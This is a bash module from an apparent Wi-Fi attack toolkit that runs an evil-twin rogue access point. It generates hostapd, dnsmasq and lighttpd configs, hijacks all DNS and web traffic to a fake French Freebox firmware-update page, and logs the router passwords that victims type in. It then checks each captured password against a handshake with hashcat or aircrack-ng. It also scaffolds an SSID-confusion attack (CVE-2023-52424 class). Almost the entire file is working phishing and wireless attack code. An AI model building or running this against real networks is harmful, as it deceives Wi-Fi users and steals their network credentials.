#!/usr/bin/env bash
# evil twin — rogue AP + captive portal + credential verification
# ── self-locate WIFISTING_ROOT ──
# When launched via pkexec, HOME is /root and any $HOME-relative path
# would land in the wrong place. Resolve WIFISTING_ROOT from this
# script's own path so state / loot / captures always end up in the
# project tree regardless of who runs us.
if [[ -z "${WIFISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    WIFISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export WIFISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

# Under pkexec, HOME=/root even though we're writing to the invoking
# user's tree. WIFISTING_ROOT is <real_home>/wifisting, so its parent
# is the real home. Reset HOME so downstream $HOME-relative defaults
# (LOOT_DIR, CAPTURES_DIR, LOGS_DIR, XDG_CONFIG_HOME, etc.) resolve
# to the user's paths instead of /root.
if [[ -n "${WIFISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$WIFISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi

: "${WIFISTING_HOME:=$WIFISTING_ROOT}"

: "${TMP_DIR:=/tmp/wifisting}"
: "${LOOT_DIR:=$HOME/wifisting/loot}"
: "${LOGS_DIR:=$HOME/wifisting/logs}"
: "${WIFISTING_HOME:=$HOME/wifisting}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$LOGS_DIR" 2>/dev/null

# Transient runtime state (config, www, pids) stays in /tmp.
# Persistent output (creds.log, PASSWORD_FOUND.txt, access logs) goes
# to loot so captured credentials survive a reboot.
ET_DIR="$TMP_DIR/eviltwin"
ET_WWW="$ET_DIR/www"
ET_CONF="$ET_DIR/conf"
ET_STATE="$ET_DIR/state"
ET_LOOT="${LOOT_DIR:-$HOME/wifisting/loot}/eviltwin"
ET_LOG="$ET_LOOT/log"
ET_CONFUSION_CONF="$ET_CONF/ssid-confusion.conf"
ET_CONFUSION_ASCONF="$ET_CONF/ssid-confusion-assoc.conf"

et_prepare() {
    mkdir -p "$ET_DIR" "$ET_WWW" "$ET_LOG" "$ET_CONF" "$ET_LOOT"

    # One-time migration: pull creds.log and PASSWORD_FOUND.txt from
    # the old /tmp location so historical captures aren't orphaned.
    local old_log="$ET_DIR/log/creds.log"
    local old_found="$ET_DIR/PASSWORD_FOUND.txt"
    if [[ -f "$old_log" && ! -e "$ET_LOG/creds.log" ]]; then
        cp "$old_log" "$ET_LOG/creds.log" 2>/dev/null || true
    fi
    if [[ -f "$old_found" && ! -e "$ET_LOOT/PASSWORD_FOUND.txt" ]]; then
        cp "$old_found" "$ET_LOOT/PASSWORD_FOUND.txt" 2>/dev/null || true
    fi
}

et_load_state() {
    [[ -f "$ET_STATE" ]] || return 1
    # shellcheck source=/dev/null
    source "$ET_STATE"
    [[ -n "${SAVED_TARGET_ESSID:-}" ]] && export TARGET_ESSID="$SAVED_TARGET_ESSID"
    [[ -n "${SAVED_TARGET_CHANNEL:-}" ]] && export TARGET_CHANNEL="$SAVED_TARGET_CHANNEL"
    [[ -n "${SAVED_AP_IFACE:-}" ]] && export ET_AP_IFACE="$SAVED_AP_IFACE"
}

et_save_state() {
    mkdir -p "$ET_DIR"
    cat > "$ET_STATE" << EOF
SAVED_TARGET_ESSID=${TARGET_ESSID:-}
SAVED_TARGET_CHANNEL=${TARGET_CHANNEL:-}
SAVED_AP_IFACE=${ET_AP_IFACE:-}
EOF
}

et_require() {
    [[ -z "$TARGET_BSSID"   && -f "$TMP_DIR/target_bssid"   ]] && export TARGET_BSSID="$(cat "$TMP_DIR/target_bssid")"
    [[ -z "$TARGET_CHANNEL" && -f "$TMP_DIR/target_channel" ]] && export TARGET_CHANNEL="$(cat "$TMP_DIR/target_channel")"
    [[ -z "$TARGET_ESSID"   && -f "$TMP_DIR/target_essid"   ]] && export TARGET_ESSID="$(cat "$TMP_DIR/target_essid")"
    [[ -z "$LAST_HASH"      && -f "$TMP_DIR/last_hash"      ]] && export LAST_HASH="$(cat "$TMP_DIR/last_hash")"
    [[ -z "$LAST_HANDSHAKE" && -f "$TMP_DIR/last_handshake" ]] && export LAST_HANDSHAKE="$(cat "$TMP_DIR/last_handshake")"

    if [[ -z "$TARGET_ESSID" || -z "$TARGET_CHANNEL" ]]; then
        err "no target — pick one in recon"
        [[ -z "${WIFISTING_CLI:-}" ]] && read -rp "  press enter " _
        return 1
    fi
    return 0
}

et_pick_ap_iface_interactive() {
    local ifaces=()
    while IFS= read -r line; do
        [[ -n "$line" ]] && ifaces+=("$line")
    done < <(et_cli_list_ap_ifaces_tsv | cut -f1)

    if (( ${#ifaces[@]} == 0 )); then
        err "no managed wireless iface available for AP"
        warn "you need a 2nd card OR to take monitor iface out of monitor mode"
        return 1
    fi
    echo ""
    local i=1
    for f in "${ifaces[@]}"; do echo "  [$i] $f"; i=$((i+1)); done
    read -rp "  AP interface> " sel
    if [[ "$sel" =~ ^[0-9]+$ ]] && (( sel >= 1 && sel <= ${#ifaces[@]} )); then
        ET_AP_IFACE="${ifaces[$((sel-1))]}"
        export ET_AP_IFACE
        ok "AP iface: $ET_AP_IFACE"
        return 0
    fi
    err "invalid"; return 1
}

et_cli_list_ap_ifaces_tsv() {
    local name driver mode
    for path in /sys/class/net/*/wireless; do
        [[ -d "$path" ]] || continue
        name="$(basename "$(dirname "$path")")"
        mode="$(iw dev "$name" info 2>/dev/null | awk '/type/ {print $2}')"
        [[ "$mode" == "monitor" ]] && continue
        driver="$(basename "$(readlink /sys/class/net/"$name"/device/driver 2>/dev/null)")"
        printf '%s\t%s\t%s\n' "$name" "${driver:-?}" "${mode:-?}"
    done
}

et_write_hostapd() {
    local ssid="$1" chan="$2" iface="$3"
    cat > "$ET_CONF/hostapd.conf" << EOF
interface=$iface
driver=nl80211
ssid=$ssid
hw_mode=g
channel=$chan
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wmm_enabled=1
EOF

    # Optional secondary SSIDs (broadcast multiple)
    if [[ -n "${ET_EXTRA_SSIDS:-}" ]]; then
        local idx=1
        IFS=',' read -ra extras <<< "$ET_EXTRA_SSIDS"
        for extra in "${extras[@]}"; do
            extra="${extra## }"; extra="${extra%% }"
            [[ -z "$extra" ]] && continue
            cat >> "$ET_CONF/hostapd.conf" << EOF

bss=$iface
ssid=$extra
wmm_enabled=1
EOF
            idx=$((idx+1))
        done
    fi
    ok "wrote hostapd.conf"
}

et_write_dnsmasq() {
    local iface="$1"
    cat > "$ET_CONF/dnsmasq.conf" << EOF
interface=$iface
bind-interfaces
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
log-queries
log-dhcp
log-facility=$ET_LOG/dnsmasq.log
EOF
    ok "wrote dnsmasq.conf"
}

et_write_lighttpd() {
    cat > "$ET_CONF/lighttpd.conf" << EOF
server.document-root = "$ET_WWW"
server.port          = 80
server.bind          = "10.0.0.1"
server.modules       = ( "mod_rewrite", "mod_cgi", "mod_accesslog" )
accesslog.filename   = "$ET_LOG/lighttpd-access.log"
server.errorlog      = "$ET_LOG/lighttpd-error.log"
index-file.names     = ( "index.html" )
mimetype.assign      = (
    ".html" => "text/html",
    ".css"  => "text/css",
    ".js"   => "application/javascript",
    ".png"  => "image/png"
)
cgi.assign = ( ".cgi" => "/bin/bash" )
# Every captive-portal detection endpoint across all major OSes:
url.rewrite-once = (
    "^/generate_204$"          => "/index.html",
    "^/gen_204$"               => "/index.html",
    "^/hotspot-detect\.html$"  => "/index.html",
    "^/hotspot-detect\.html\?.*$" => "/index.html",
    "^/library/test/success\.html$" => "/index.html",
    "^/ncsi\.txt$"             => "/index.html",
    "^/connecttest\.txt$"      => "/index.html",
    "^/redirect$"              => "/index.html",
    "^/canonical\.html$"       => "/index.html",
    "^/success\.txt$"          => "/index.html",
    "^/kindle-wifi/wifistub\.html$" => "/index.html"
)
EOF
    ok "wrote lighttpd.conf"
}

et_write_portal() {
    cat > "$ET_WWW/index.html" << 'HTML'
<!DOCTYPE html>
<html lang="fr"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Mise à jour du firmware — Freebox</title>
<style>
*{box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
     background:#eceff3;margin:0;padding:16px;color:#20242b}
.box{max-width:440px;margin:24px auto;background:#fff;border-radius:14px;
     box-shadow:0 6px 24px rgba(16,24,40,.12);overflow:hidden}
.head{background:#cd1a2b;padding:18px 22px;color:#fff;display:flex;
      align-items:center;gap:10px}
.head .dot{width:26px;height:26px;border-radius:50%;background:#fff;
           color:#cd1a2b;font-weight:700;display:flex;align-items:center;
           justify-content:center;font-size:15px}
.head b{font-size:17px;font-weight:600;letter-spacing:.2px}
.body{padding:22px}
h1{font-size:19px;margin:0 0 6px}
.lead{margin:0 0 16px;color:#5b6472;font-size:14px;line-height:1.45}
.meta{background:#f6f8fa;border-radius:10px;padding:12px 14px;margin:0 0 16px}
.meta div{display:flex;justify-content:space-between;font-size:13px;
          padding:5px 0}
.meta span{color:#6b7480}
.meta b{font-weight:600}
.warn{background:#fff6e5;border-left:4px solid #f0a500;padding:11px 13px;
      border-radius:6px;font-size:13px;line-height:1.45;color:#6a4a00;
      margin:0 0 16px}
label{display:block;font-size:13px;font-weight:600;margin:0 0 6px}
input{width:100%;padding:13px;border:1px solid #ccd2da;border-radius:9px;
      font-size:16px;margin:0 0 14px}
input:focus{outline:2px solid #cd1a2b33;border-color:#cd1a2b}
button{width:100%;padding:14px;background:#cd1a2b;color:#fff;border:0;
       border-radius:9px;font-size:16px;font-weight:600;cursor:pointer}
button:active{background:#a81524}
.small{font-size:12px;color:#7a828e;margin:14px 0 0;text-align:center;
       line-height:1.45}
.foot{font-size:11px;color:#9aa1ab;text-align:center;padding:0 22px 18px}
</style></head><body>
<div class="box">
  <div class="head"><span class="dot">fb</span><b>freebox</b></div>
  <div class="body">
    <h1>Mise à jour du firmware</h1>
    <p class="lead">Une mise à jour de sécurité est disponible pour votre Freebox.
       L’installation demande environ deux minutes pendant lesquelles votre
       connexion sera interrompue.</p>

    <div class="meta">
      <div><span>Freebox</span><b id="ssid"></b></div>
      <div><span>Version installée</span><b>4.13.0</b></div>
      <div><span>Version disponible</span><b>4.13.9</b></div>
    </div>

    <div class="warn">Pour autoriser l’installation, saisissez votre mot de passe
      Freebox OS. Il sert uniquement à valider cette mise à jour.</div>

    <form method="POST" action="/submit.cgi">
      <label for="pw">Mot de passe Freebox OS</label>
      <input type="password" id="pw" name="pw" placeholder="Mot de passe"
             required minlength="8" autocomplete="current-password">
      <button type="submit">Installer la mise à jour</button>
    </form>

    <p class="small">Ne débranchez pas votre Freebox pendant la mise à jour.</p>
  </div>
  <div class="foot">Interface de gestion Freebox — mise à jour du système</div>
</div>
<script>document.getElementById('ssid').textContent =
  decodeURIComponent('SSID_PLACEHOLDER');</script>
</body></html>
HTML
    # sed with a delimiter unlikely to be in the SSID
    local safe_ssid="${TARGET_ESSID//\\/}"
    python3 -c "
import sys
with open('$ET_WWW/index.html','r') as f: t=f.read()
t=t.replace('SSID_PLACEHOLDER', sys.argv[1])
with open('$ET_WWW/index.html','w') as f: f.write(t)
" "$safe_ssid"

    cat > "$ET_WWW/submit.cgi" << 'CGI'
#!/usr/bin/env bash
echo "Content-Type: text/html"
echo ""
read -n "${CONTENT_LENGTH:-0}" POST_DATA
PW=$(printf '%s' "$POST_DATA" | sed 's/^pw=//' | python3 -c "import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read()))")
TS=$(date +%s)
echo "$TS $PW" >> "$ET_LOG_PATH/creds.log"
echo "<html><head><meta charset=\"utf-8\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><title>Mise à jour en cours</title><style>body{font-family:-apple-system,sans-serif;background:#eceff3;margin:0;padding:16px;color:#20242b}.b{max-width:440px;margin:40px auto;background:#fff;border-radius:14px;padding:26px;box-shadow:0 6px 24px rgba(16,24,40,.12);text-align:center}h2{color:#cd1a2b;font-size:18px;margin:0 0 10px}p{color:#5b6472;font-size:14px;line-height:1.5}</style></head><body><div class=\"b\"><h2>Mise à jour en cours</h2><p>Votre Freebox redémarre. La connexion sera rétablie dans environ deux minutes.<br>Ne débranchez pas l\u2019appareil.</p></div></body></html>"
CGI
    # substitute the log path
    python3 -c "
with open('$ET_WWW/submit.cgi','r') as f: t=f.read()
t=t.replace('\$ET_LOG_PATH', '$ET_LOG')
with open('$ET_WWW/submit.cgi','w') as f: f.write(t)
"
    chmod +x "$ET_WWW/submit.cgi"
    ok "captive portal written"
}

et_setup_network() {
    local iface="$1"
    info "configuring $iface with 10.0.0.1/24"
    ip link set "$iface" down
    ip addr flush dev "$iface"
    ip link set "$iface" up
    ip addr add 10.0.0.1/24 dev "$iface"

    # Confirm the address survived. If NM took it back, DHCP will silently
    # serve a subnet with no gateway, so fail loudly here instead.
    if ! ip -4 addr show "$iface" 2>/dev/null | grep -q 'inet 10\.0\.0\.1/24'; then
        printf 'ERROR\t%s does not hold 10.0.0.1/24 after setup\n' "$iface" >&2
        printf 'ERROR\tsomething reclaimed the interface (NetworkManager?) - the AP cannot serve DHCP\n' >&2
        return 1
    fi

    sysctl -w net.ipv4.ip_forward=1 >/dev/null
    iptables -t nat -F
    iptables -F
    iptables -t nat -A PREROUTING -i "$iface" -p tcp --dport 80  -j DNAT --to-destination 10.0.0.1:80
    iptables -t nat -A PREROUTING -i "$iface" -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:80
    iptables -A FORWARD -i "$iface" -j DROP
    ok "network configured"
}

# ── FIXED: password verification ──
et_verify_password() {
    local pw="$1"
    if [[ -z "$LAST_HASH" && -z "$LAST_HANDSHAKE" ]]; then
        return 2   # no reference
    fi

    local tmpwl tmppot tmpout
    tmpwl=$(mktemp)
    tmppot=$(mktemp)
    tmpout=$(mktemp)
    printf '%s\n' "$pw" > "$tmpwl"

    local ok=1

    if [[ -n "$LAST_HASH" && -f "$LAST_HASH" ]]; then
        if hashcat -m 22000 -a 0 "$LAST_HASH" "$tmpwl" \
            --potfile-path "$tmppot" \
            --outfile "$tmpout" \
            --outfile-format 2 \
            --quiet >/dev/null 2>&1
        then
            # hashcat returns 0 on crack. But verify by outfile content.
            if [[ -s "$tmpout" ]]; then
                ok=0
            fi
        fi
    fi

    if (( ok != 0 )) && [[ -n "$LAST_HANDSHAKE" && -f "$LAST_HANDSHAKE" ]]; then
        # aircrack-ng path — feed single-password wordlist
        local aout
        aout=$(aircrack-ng -w "$tmpwl" -b "$TARGET_BSSID" "$LAST_HANDSHAKE" 2>/dev/null)
        if echo "$aout" | grep -q "KEY FOUND"; then
            ok=0
        fi
    fi

    rm -f "$tmpwl" "$tmppot" "$tmpout"
    return $ok
}

et_watch_creds() {
    local credlog="$ET_LOG/creds.log"
    : > "$credlog"
    info "watching $credlog for captured credentials..."
    info "press ctrl-c to stop the evil twin"
    tail -F "$credlog" 2>/dev/null | while read -r line; do
        local ts pw
        ts=$(echo "$line" | awk '{print $1}')
        pw=$(echo "$line" | cut -d' ' -f2-)
        echo ""
        echo "  [$(date -d @"$ts" +%H:%M:%S 2>/dev/null || echo "$ts")] cred received: $pw"
        et_verify_password "$pw"
        case $? in
            0) echo "  *** PASSWORD VERIFIED: $pw ***"
               echo "$pw" > "$ET_DIR/PASSWORD_FOUND.txt"
               ok "saved to $ET_DIR/PASSWORD_FOUND.txt"
               et_cli_teardown
               break ;;
            1) warn "password does not match handshake — victim mistyped, keep waiting" ;;
            2) warn "unverified (no hash) — manually check: $pw" ;;
        esac
    done
}

# Write the state of the AP as it was DURING the launch.
#
# Diagnosing this from outside is impossible: the operator has to reconnect to
# the internet to report back, which rewrites the interface address and mode -
# so every post-hoc reading describes the recovery, not the attack. This
# snapshot is taken while it is actually running and kept.
# Snapshot the AP state on demand. Run this WHILE the client is failing, then
# reconnect and report: the reading survives, the live state does not - the
# operator has to get back online to reply, which rewrites the interface.
et_cli_diagnose() {
    local iface ssid channel
    iface=$(awk -F= '/^interface=/{print $2; exit}' "$ET_CONF/hostapd.conf" 2>/dev/null)
    ssid=$(awk -F= '/^ssid=/{print $2; exit}' "$ET_CONF/hostapd.conf" 2>/dev/null)
    channel=$(awk -F= '/^channel=/{print $2; exit}' "$ET_CONF/hostapd.conf" 2>/dev/null)
    [[ -z "$iface" ]] && { printf 'ERROR\tno AP configured yet\n' >&2; return 1; }
    et_write_launch_report "$iface" "${ssid:-?}" "${channel:-?}"

    if [[ -s "$ET_LOG/leases" ]]; then
        printf 'LEASES\t%s\n' "$(grep -c . "$ET_LOG/leases")"
        tail -n 5 "$ET_LOG/leases" | while IFS= read -r l; do
            printf 'LEASE\t%s\n' "$l"
        done
    else
        printf 'LEASES\t0 (no client has ever taken a lease)\n'
    fi
    [[ -s "$ET_LOG/dnsmasq.log" ]] && tail -n 8 "$ET_LOG/dnsmasq.log" | while IFS= read -r l; do
        printf 'DM\t%s\n' "$l"
    done
}


et_write_launch_report() {
    local iface="$1" ssid="$2" channel="$3"
    local rep="$ET_LOG/launch-report.txt"
    {
        printf 'when\t%s\n' "$(date -Is)"
        printf 'iface\t%s\n' "$iface"
        printf 'ssid\t%s\n' "$ssid"
        printf 'channel\t%s\n' "$channel"
        printf 'type\t%s\n' "$(iw dev "$iface" info 2>/dev/null | awk '/type/ {print $2; exit}')"
        printf 'addr\t%s\n' "$(ip -4 -o addr show "$iface" 2>/dev/null | awk '{print $4}' | tr '\n' ' ')"
        printf 'operstate\t%s\n' "$(cat "/sys/class/net/$iface/operstate" 2>/dev/null)"
        printf 'hostapd_pid\t%s\n' "$(cat "$ET_DIR/hostapd.pid" 2>/dev/null)"
        printf 'hostapd_alive\t%s\n' "$([[ -d "/proc/$(cat "$ET_DIR/hostapd.pid" 2>/dev/null)" ]] && echo yes || echo no)"
        printf 'dnsmasq_alive\t%s\n' "$(pgrep -x dnsmasq >/dev/null && echo yes || echo no)"
        printf 'nm_managed\t%s\n' "$(nmcli -t -f GENERAL.STATE device show "$iface" 2>/dev/null | head -1)"
        printf 'iptables_nat\n'
        iptables -t nat -S 2>/dev/null | sed 's/^/  /' | head -12
        printf 'hostapd_log_tail\n'
        tail -n 15 "$ET_LOG/hostapd.log" 2>/dev/null | sed 's/^/  /'
    } > "$rep" 2>&1
    printf 'REPORT\t%s\n' "$rep"
}


et_launch_privileged() {
    local iface="$1" ssid="$2" channel="$3" extras="${4:-}"

    export ET_AP_IFACE="$iface"
    export TARGET_ESSID="$ssid"
    export TARGET_CHANNEL="$channel"
    export ET_EXTRA_SSIDS="$extras"
    [[ -z "${TARGET_BSSID:-}" ]] && \
        TARGET_BSSID=$(cat "/sys/class/net/$iface/address" 2>/dev/null)
    export TARGET_BSSID

    # NetworkManager must release the interface BEFORE we configure it. Left
    # managed, NM sees the link come up, runs its own DHCP against the real
    # LAN, and REPLACES the 10.0.0.1/24 we assign. dnsmasq then hands out
    # leases pointing at a gateway that no longer exists, and the client
    # stalls at "IP configuration" with nothing in any log to explain it.
    if command -v nmcli >/dev/null 2>&1; then
        nmcli device disconnect "$iface" 2>/dev/null || true
        nmcli device set "$iface" managed no 2>/dev/null || true
    fi

    et_prepare
    et_write_hostapd "$ssid" "$channel" "$iface"
    et_write_dnsmasq "$iface"
    et_write_lighttpd
    et_write_portal
    # ORDER MATTERS. AP mode goes first, because switching type flushes the
    # interface - running it after et_setup_network wiped the 10.0.0.1/24 that
    # setup had just assigned, so dnsmasq had no address to serve DHCP from
    # and every client stalled at "IP configuration" while hostapd's log
    # cheerfully showed them associating.
    # The adapter must be free and in AP mode BEFORE hostapd starts. Leaving
    # it to hostapd fails whenever the interface is associated as a client -
    # the normal state of a spare adapter - and the failure is a refusal deep
    # in hostapd's log with nothing to connect it to the real cause.
    if [[ -e "/sys/class/net/$iface" ]]; then
        ip addr flush dev "$iface" 2>/dev/null || true
        ip link set "$iface" down 2>/dev/null || true
        iw dev "$iface" set type __ap 2>/dev/null || \
            iw dev "$iface" set type ap 2>/dev/null || true
        ip link set "$iface" up 2>/dev/null || true

        local atype
        atype=$(iw dev "$iface" info 2>/dev/null | awk '/type/ {print $2; exit}')
        printf 'IFACE\t%s\ttype=%s\n' "$iface" "${atype:-unknown}"
        # iw capitalises this on some builds; compare case-insensitively or a
        # good mode change is reported as a failure.
        if [[ "${atype,,}" != "ap" && "${atype,,}" != "__ap" ]]; then
            local amode
            amode=$(iw dev "$iface" info 2>/dev/null | awk '/ssid/ {print $2; exit}')
            printf 'ERROR\tcould not put %s into AP mode (type=%s%s)\n' \
                "$iface" "${atype:-unknown}" \
                "${amode:+, still associated to $amode}" >&2
            printf 'ERROR\tdisconnect it first, or pick another adapter\n' >&2
            return 1
        fi
    fi


    et_setup_network "$iface"

    hostapd "$ET_CONF/hostapd.conf" \
        > "$ET_LOG/hostapd.log" 2>&1 &
    echo $! > "$ET_DIR/hostapd.pid"
    sleep 3

    # Verify hostapd actually came up BEFORE going further. Without this the
    # script started dnsmasq and lighttpd and then blocked in et_watch_creds,
    # so a launch that failed outright looked identical to one that was
    # simply waiting for a client - and because the watcher never returns,
    # the GUI sat on "Launching" with nothing to report either way.
    local hpid
    hpid=$(cat "$ET_DIR/hostapd.pid" 2>/dev/null)
    if [[ -z "$hpid" || ! -d "/proc/$hpid" ]]; then
        printf 'ERROR\thostapd did not start\n' >&2
        tail -n 6 "$ET_LOG/hostapd.log" 2>/dev/null | while IFS= read -r l; do
            printf 'LOG\t%s\n' "$l" >&2
        done
        local itype
        itype=$(iw dev "$iface" info 2>/dev/null | awk '/type/ {print $2; exit}')
        if [[ "$itype" != "ap" ]]; then
            printf 'ERROR\t%s is in %s mode; hostapd needs AP mode\n' \
                "$iface" "${itype:-unknown}" >&2
        fi
        return 1
    fi
    printf 'HOSTAPD\trunning\tpid %s\n' "$hpid"

    dnsmasq -C "$ET_CONF/dnsmasq.conf" -d \
        > "$ET_LOG/dnsmasq-verbose.log" 2>&1 &
    echo $! > "$ET_DIR/dnsmasq.pid"
    sleep 1

    lighttpd -f "$ET_CONF/lighttpd.conf" \
        2> "$ET_LOG/lighttpd-cli.log"
    sleep 1

    echo $$ > "$TMP_DIR/eviltwin.pid"
    trap 'et_cli_teardown; exit 0' INT TERM

    # Snapshot before blocking: once the watcher runs there is no return path,
    # and the operator will reconnect to the internet before reporting back.
    et_write_launch_report "$iface" "$ssid" "$channel"
    sleep 12
    et_write_launch_report "$iface" "$ssid" "$channel" 

    et_watch_creds
}

et_cli_launch() {
    local iface="$1" ssid="$2" channel="$3" extras="${4:-}"
    if [[ -z "$iface" || -z "$ssid" || -z "$channel" ]]; then
        printf 'usage: --launch IFACE SSID CHANNEL [EXTRA_SSIDS]\n' >&2
        return 2
    fi

    if (( EUID != 0 )); then
        # Do NOT wrap this in `pkexec env VAR=...`: the polkit rule matches on
        # the program path, and with env the program is /usr/bin/env, so the
        # rule never matches and the prompt is unreadable or the call fails.
        # The env vars were also unnecessary — this script self-locates
        # WIFISTING_ROOT from its own path and resets HOME on startup.
        exec pkexec "$(readlink -f "${BASH_SOURCE[0]}")" \
            --privileged-launch "$iface" "$ssid" "$channel" "$extras"
    fi

    et_launch_privileged "$iface" "$ssid" "$channel" "$extras"
}

# ═══════════════════════════════════════════════════════════════════
#  SSID confusion (CVE-2023-52424 class)
# ═══════════════════════════════════════════════════════════════════
# The 802.11 standard does not bind the SSID into the 4-way handshake, so a
# client can be made to believe it is on network A while the association (and
# the PMK derivation) actually completes against network B. This is a
# CLIENT-SIDE confusion attack: it does not crack anything, it makes the
# victim land on the wrong network while its UI shows the trusted name.
#
# Config generation is the deliverable here and always runs. Stock hostapd
# advertises and associates with the same single ssid= per BSS, so it cannot
# express the mismatch; the launcher therefore needs the patched
# SSID-confusion build, and the launch is refused by name when it is absent.

et_write_ssid_confusion() {
    local real="$1" fake="$2" chan="$3" iface="$4"

    # Reuse the module's existing hostapd config generator for the beacon
    # side — identical shape to every other AP this module stands up.
    # ET_EXTRA_SSIDS is cleared for the call: a confusion AP must advertise
    # exactly the one trusted SSID, nothing else.
    local _saved_extras="${ET_EXTRA_SSIDS:-}"
    ET_EXTRA_SSIDS=""
    et_write_hostapd "$real" "$chan" "$iface" >/dev/null
    ET_EXTRA_SSIDS="$_saved_extras"

    {
        printf '# SSID confusion (CVE-2023-52424 class) — beacon side\n'
        printf '# Beacon/probe-response SSID = %s : this is the name the victim UI shows.\n' "$real"
        cat "$ET_CONF/hostapd.conf"
        printf '\n# Association / 4-way-handshake SSID = %s\n' "$fake"
        printf '# NOT a stock hostapd directive: stock hostapd advertises and associates\n'
        printf '# with the same ssid=, so the mismatch needs the patched SSID-confusion\n'
        printf '# build. Recorded here as the specification the launcher must satisfy.\n'
        printf 'assoc_ssid=%s\n' "$fake"
    } > "$ET_CONFUSION_CONF"

    # The association-side BSS: the network the victim actually ends up on.
    # This one stock hostapd CAN run, which is why it is a separate file.
    # ENVIRON, not `awk -v`: -v runs the value through awk's escape handling,
    # which silently mangles an SSID containing a backslash.
    ET_FAKE_SSID="$fake" awk '
        /^ssid=/ { print "ssid=" ENVIRON["ET_FAKE_SSID"]; next }
        { print }
    ' "$ET_CONF/hostapd.conf" > "$ET_CONFUSION_ASCONF"

    printf 'CONF\t%s\n'       "$ET_CONFUSION_CONF"
    printf 'ASSOC_CONF\t%s\n' "$ET_CONFUSION_ASCONF"
}

# The interface the rogue AP would use, with the facts the gate needs.
# Prints IFACE<TAB>AP_MODE<TAB>MODE<TAB>CONNECTED.
et_ap_iface_report() {
    local want="${1:-}" name ap mode conn phy
    local names=()
    if [[ -n "$want" ]]; then
        names=("$want")
    else
        for path in /sys/class/net/*/wireless; do
            [[ -d "$path" ]] || continue
            names+=("$(basename "$(dirname "$path")")")
        done
    fi
    [[ ${#names[@]} -eq 0 ]] && { printf '\tno\t?\t?\n'; return 0; }

    for name in "${names[@]}"; do
        [[ -e "/sys/class/net/$name" ]] || continue
        mode=$(iw dev "$name" info 2>/dev/null | awk '/type/ {print $2; exit}')
        phy=$(cat "/sys/class/net/$name/phy80211/name" 2>/dev/null)
        ap="no"
        if [[ -n "$phy" ]] && \
           iw phy "$phy" info 2>/dev/null | grep -qE '^[[:space:]]*\* AP$|AP/VLAN'; then
            ap="yes"
        fi
        conn="no"
        iw dev "$name" link 2>/dev/null | grep -q '^Connected to' && conn="yes"
        printf '%s\t%s\t%s\t%s\n' "$name" "$ap" "${mode:-?}" "$conn"
        return 0
    done
    printf '\tno\t?\t?\n'
}

# A daemon able to advertise one SSID while associating against another.
# Stock hostapd deliberately is not one — see the BLOCKER text.
et_find_confusion_tool() {
    local c p
    for c in ssid-confusion hostapd-ssidconf ssidconf; do
        if command -v "$c" >/dev/null 2>&1; then command -v "$c"; return 0; fi
    done
    for p in "$WIFISTING_ROOT/external/ssid-confusion/ssid-confusion" \
             "$HOME/wifisting/external/ssid-confusion/ssid-confusion"; do
        [[ -x "$p" ]] && { printf '%s\n' "$p"; return 0; }
    done
    return 1
}

# Pure gate over the probed facts: prints every blocking condition, one per
# line, and returns 0 if there is at least one. Kept free of live probing so
# the selftest can assert each branch.
et_ssid_confusion_blockers() {
    local iface="$1" ap_mode="$2" mode="$3" connected="$4" tool="$5" n=0
    if [[ -z "$iface" ]]; then
        printf 'no wireless interface available for the rogue AP\n'
        n=1
    else
        if [[ "$ap_mode" != "yes" ]]; then
            printf '%s does not advertise AP mode (iw phy info)\n' "$iface"
            n=1
        fi
        if [[ "$connected" == "yes" ]]; then
            printf '%s is carrying the live connection (iw dev %s link) — refusing to take the operator offline\n' \
                "$iface" "$iface"
            n=1
        fi
        if [[ "$mode" == "monitor" ]]; then
            printf '%s is in monitor mode; the rogue AP has to transmit, which would tear the monitor interface down\n' \
                "$iface"
            n=1
        fi
    fi
    if [[ -z "$tool" ]]; then
        printf 'no daemon that can advertise one SSID while associating against another — stock hostapd sets a single ssid= per BSS, so this needs the patched SSID-confusion build\n'
        n=1
    fi
    (( n > 0 )) && return 0
    return 1
}

et_ssid_confusion_plan() {
    local bssid="$1" real="$2" fake="$3" dur="$4" iface="$5" tool="$6"
    printf 'PLAN\tverb\t--ssid-confusion\n'
    printf 'PLAN\tbssid\t%s\n' "$bssid"
    printf 'PLAN\tbeacon_ssid\t%s\n' "$real"
    printf 'PLAN\tassoc_ssid\t%s\n' "$fake"
    printf 'PLAN\tduration\t%s\n' "$dur"
    printf 'PLAN\tiface\t%s\n' "${iface:-<none available>}"
    printf 'PLAN\tdaemon\t%s\n' "${tool:-<none installed>}"
    printf 'PLAN\tclass\tCVE-2023-52424 — SSID is not authenticated in the 4-way handshake\n'
    printf 'PLAN\tstep\t1. beacon/probe-response frames advertise %s\n' "$real"
    printf 'PLAN\tstep\t2. the association and 4-way handshake complete against %s\n' "$fake"
    printf 'PLAN\tstep\t3. the client derives the PMK from %s and shows %s to the user\n' \
        "$fake" "$real"
    printf 'PLAN\tstep\t4. hold the rogue BSS for %ss and capture what the client does\n' "$dur"
    printf 'PLAN\tconfig\t%s\n' "$ET_CONFUSION_CONF"
    printf 'PLAN\tassoc_config\t%s\n' "$ET_CONFUSION_ASCONF"
    printf 'PLAN\trequires\tsame authentication credentials as the network named by the beacon SSID\n'
    printf 'PLAN\thonesty\tthis confuses the client about which network it is on; it does not recover the password\n'
}

